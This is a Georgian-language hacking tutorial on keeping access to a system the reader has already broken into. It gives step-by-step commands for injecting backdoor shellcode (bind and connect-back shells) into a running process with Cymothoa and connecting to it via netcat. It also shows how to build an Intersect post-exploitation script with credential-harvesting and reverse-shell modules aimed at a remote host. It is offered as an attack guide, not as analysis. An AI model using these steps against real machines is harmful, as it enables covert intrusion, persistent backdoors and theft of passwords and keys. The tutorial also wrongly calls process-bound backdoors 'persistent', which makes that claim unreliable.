# შესავალი

ვთქვათ შენ სისტემა გატეხე და შიგ შეახწიე, დრო გავიდა და სისუსტე რომლის ექსპლუატაციაც მოახერხე აღარ არსებობს იმიტომ რომ სისტემის ადმინისტრატორმა აფდეითი გააკეთა და პროგრამას რომელსაც სისუსტე ქონდა სხვა ვერსიისაა რომელსაც სისუსტე აღარა აქვს. სისტემაში რომ დარჩე ისე რომ ახლიდან შეგეძლოს დაბრუნება გჭირდება ბექდორი რომლის მეშვეობთაც კავშირს ხელახლა დაამყარებ.

# Cymothoa

Cymothoa არის ბექდორული ხელსაწყო რომელიც გაძლევს საშუალებას რომ შელკოდის ინექცია განახორციელო სხვა პრცესში (გაშვებულ პროგრამაში). ასე ბექდორი სხვა პროცესში მოქმედებს რასაც ადმინისტრატორის ყურადღებას არ იწვევს, არც უშიშროების სკანერების თუ მეხსიერების ანალიზი არ განხორციელდა.

აუცილებელი პარამეტრებია:
  * -p (process ID, PID): პროცესის ნომერი რომელშიც ინექცია განხორციელდება
  * -s: შელკოდის ნომერი

შელშკოდების სიის ნახვა:

```
hacker@kali ~> cymothoa -S

0 - bind /bin/sh to the provided port (requires -y)
1 - bind /bin/sh + fork() to the provided port (requires -y) - izik <izik@tty64.org>
2 - bind /bin/sh to tcp port with password authentication (requires -y -o)
3 - /bin/sh connect back (requires -x, -y)
4 - tcp socket proxy (requires -x -y -r) - Russell Sanford (xort@tty64.org)
5 - script execution (see the payload), creates a tmp file you must remove
6 - forks an HTTP Server on port tcp/8800 - http://xenomuta.tuxfamily.org/
7 - serial port busybox binding - phar@stonedcoder.org mdavis@ioactive.com
8 - forkbomb (just for fun...) - Kris Katterjohn
9 - open cd-rom loop (follows /dev/cdrom symlink) - izik@tty64.org
10 - audio (knock knock knock) via /dev/dsp - Cody Tubbs (pigspigs@yahoo.com)
11 - POC alarm() scheduled shellcode
12 - POC setitimer() scheduled shellcode
13 - alarm() backdoor (requires -j -y) bind port, fork on accept
14 - setitimer() tail follow (requires -k -x -y) send data via upd
```

გატეხილ სისტემაში უნდა გადაიტანო პროგრამა cymothoa რომ ბექდორი შექმნა რომელიმე აქტიურ პროცესში შელკოდის ინექციით.

გაშვებული პროცესების სიის სანახავთ:

```
hacker@kali ~> ps -aux
```

შევქმათ ბექდორი რომელიც აეკიდება პროცესს ნომერ 3287, გაუშვებს ნომერ პირველ შელკოდს და კავშირის დამყარება შესაძლებელი იქნება პორტ ნომერ 3000-ზე:
```
hacker@kali ~> ./cymothoa -p 3287 -s 1 -y 3000
```

ბექდორთან დაკავშირება:

გატეხილი კომპიუტერის მისამართია: 168.0.1.4

```
hacker@kali ~> nc –nvv 168.0.1.4 3000
```

**ყურადღებით**:
რადგამ ბექდორი აკიდებულია გაშევბულ პროცესს, ეს ნიშნავს რომ როცა პროცესი გაუქმდება, მაგალითად მომხმარე ამ პროგრამას გამორთავს, ბექდორის გამოირთვება. ან როცა მომხმარე კომპიუტერს გამორთავს.
ასეთი პირებობში გადამჩენ ბექდორებს ეძახიან მუდმივ ბექდორებს (persistent backdoors).

# Intersect

Intersect-ი არის ხელსაწყო რომლის მეშვეობით შეგიძლია გატეხვის შემდგომ სხვადასხვა საქმის ავტომატიზაცია როგორიცაა პაროლის ფაილების შეგროვენა, ssh გასაღებების კოპირება, ინფრომაციის დაგროვება ქსელის შესახებ, ანტივირუსის და ფაირვლის პროგრამების დადგენა.

ეს ყველაფერი რომ მოხდეს, intersect-ი გთავაზობს არჩევნების გაკეთებას და პარამეტრების შევსებას რომ მან შექმნას სკრიპტი პითონში.
მხოლოდ 3 ეტაპია საჭირო:
  * არჩიე სასურველი მოდულები
  * მიუთითე პარამეტრები (პორტი, ჰოსტი)
  * შეაქმევინე სკრიპტი

როცა გაუშვებ intersect-ს, იბეჭდება ესეთი მენიუ:

```
hacker@kali ~> sudo intersect 
                         
              ___         __                                     __   
             |   |.-----.|  |_ .-----..----..-----..-----..----.|  |_ 
             |.  ||     ||   _||  -__||   _||__ --||  -__||  __||   _|
             |.  ||__|__||____||_____||__|  |_____||_____||____||____|
             |:  | post-exploitation framework                                                    
             |::.|                                                   
             `---'                                                    


Intersect 2.5 - Script Creation Utility
------------------------------------------
1 => Create Custom Script
2 => List Available Modules
3 => Load Plugin Module
4 => Exit Creation Utility


 => 1 
```

აირჩიე 1 (**Create Custom Script**).

```
Intersect 2.0 - Script Generation Utility
---------- Create Custom Script -----------

 Instructions: 

Use the console below to create your custom
Intersect script. Type the modules you wish 
to add, pressing [enter] after each module. 
Example:
 => creds
 => network

When you have entered all your desired modules
into the queue, start the build process by typing :create. 

** To view a full list of all available commands type :help.
The command :quit will return you to the main menu.

 =>  
```

მოდულების სანახავად ჩაწერე **:modules**
მოდულის შესარჩევად ჩაწერ მოდულის სახელწოდებას.

```
=>  :modules
archive  bshell  creds	daemon	extras	lanmap	network  osuser  reversexor  rshell  scrub  xorshell
aeshttp  egressbuster  getrepos  icmpshell  openshares	persistent  portscan  privesc  sniff  udpbind  webproxy  xmlcrack  xmpp
```

რომ გაეცნო ინფორმაციას მაგალითად creds მოდულზე, ჩაწერე :**info creds**

```
=>  :info creds

Description:  Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
 
Author:  ohdae [bindshell@live.com]
```

ვირჩევთ მოდულ reversexor-ს.

```
=>  reversexor
reversexor added to queue.
```

შევაქმნევინოთ სკრიპტი, ვბეჭდავთ **:create**-ს და მივუთითებთ პარამეტრებს.
```
 =>  :create

[ Set Options ]
If any of these options don't apply to you, press [enter] to skip.
Enter a name for your Intersect script. The finished script will be placed in the Scripts directory. Do not include Python file extension.
 =>  newbiexample
Script will be saved as /usr/share/intersect/Scripts/newbiexample.py

Specify the directory on the target system where the gathered files and information will be saved to.
*Important* This should be a NEW directory. When exiting Intersect, this directory will be deleted if it contains no files.
If you skip this option, the default (/tmp/lift+$randomstring) will be used.
temp directory  =>  
enable logging  =>  
bind port  =>  1234
[+] bind port saved.
remote host  =>  168.0.1.4
[+] remote host saved.
remote port  =>  7654
[+] remote port saved.
proxy port  =>  8769
[+] proxy port saved.
xor cipher key  =>  5433
[+] xor key saved.
reversexor

[+] Your custom Intersect script has been created!
   Location: /usr/share/intersect/Scripts/newbiexample.py
```
